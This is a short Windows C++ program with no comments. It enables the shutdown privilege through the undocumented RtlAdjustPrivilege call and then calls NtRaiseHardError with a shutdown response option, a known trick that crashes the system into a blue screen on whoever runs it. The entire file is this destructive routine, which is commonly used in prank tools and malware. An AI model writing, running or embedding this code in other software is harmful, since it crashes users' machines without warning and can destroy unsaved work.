
#include <iostream>
#include <Windows.h>
#pragma comment(lib,"ntdll.lib")

using namespace std;

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Responce);

int main() {

	BOOLEAN b;

	unsigned long responce;
	
	RtlAdjustPrivilege(19, true, false, &b);

	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &responce);


		
	return 0;

}
